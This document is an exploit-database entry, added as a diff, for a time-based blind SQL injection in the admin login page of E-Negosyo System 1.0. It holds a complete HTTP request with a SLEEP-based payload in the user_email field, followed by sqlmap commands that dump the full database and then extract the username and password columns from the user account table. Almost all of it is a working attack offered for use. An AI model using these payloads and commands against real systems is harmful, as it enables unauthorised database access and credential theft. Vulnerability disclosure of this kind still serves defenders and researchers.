@@ -1,0 +1,53 @@
+id: 36788
+date: 09/22/2021
+title: E-Negosyo System 1.0 SQL Injection Vulnerability
+author: Janik Wehrli
+cves: 
+
+# Exploit Title: E-Negosyo System 1.0 - Time-Based Blind SQLi - admin/login.php
+# Exploit Author: Janik Wehrli
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/bsenordering_0.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: Ubuntu 18.04, Windows 10 Home
+
+
+# The Parameter user_email in the file /admin/login.php is vulnerable to a Time based blind SQL injection.
+# It's possible to inject malicous SQL queries and for e.g. dump the database
+
+# POC 1 - Request sleeps for 5 seconds
+# Vulnerable Request with test payload: '+AND+(SELECT+100+FROM+(SELECT(SLEEP(5)))aaa)+AND+'abc'%3d'abc
+
+POST /bsenordering/admin/login.php HTTP/1.1
+Host: 192.168.159.170
+Content-Length: 129
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.159.170
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.159.170/bsenordering/admin/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: de-CH,de-DE;q=0.9,de;q=0.8,en-US;q=0.7,en;q=0.6
+Cookie: __news247__logged=1; __news247__key=1291977b6ceff418f2a502a0dfd9de18; PHPSESSID=j5vc7kpnsudjnkjf2v3l649lp0
+Connection: close
+
+user_email='+AND+(SELECT+100+FROM+(SELECT(SLEEP(5)))aaa)+AND+'abc'%3d'abc%26user_pass%3daaa%26btnLogin%3d&user_pass=aaa&btnLogin=
+
+
+
+# POC 2 - Dump the Database with sqlmap
+# Capture a sample request to /admin/login.php with burp and save it to a file for easier use.
+sqlmap -r request --dbms mysql --level 5 --risk 3 --dump
+
+
+
+
+# POC 3 - Dump the U_NAME and U_PASS field from the tbluseraccounts with sqlmap
+# Capture a sample request to /admin/login.php with burp and save it to a file for easier use.
+
+sqlmap -r request --dbms mysql --level 5 --risk 3 --dump -D dbbsenordering -T tbluseraccount --proxy=http://127.0.0.1:8080 -C U_PASS,U_NAME
+
+#  0day.today [2023-03-25]  #
